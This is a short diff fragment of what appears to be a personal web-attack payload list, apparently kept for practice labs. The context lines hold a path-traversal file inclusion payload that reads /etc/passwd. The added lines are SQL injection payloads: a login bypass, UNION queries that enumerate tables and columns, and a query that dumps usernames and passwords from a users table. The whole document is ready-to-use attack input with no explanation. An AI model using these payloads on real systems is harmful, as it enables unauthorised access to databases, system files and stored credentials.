@@ -20,3 +20,14 @@ Command Injection Payload :
 
 File Inclusion Payload : 
 ?page=../../../../../../etc/passwd
+
+
+SQL Injection : 
+
+1' OR '1'='1'#
+
+'UNION SELECT table_name, NULL FROM information_schema.tables #
+
+'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' #
+
+'UNION SELECT user, password FROM users #
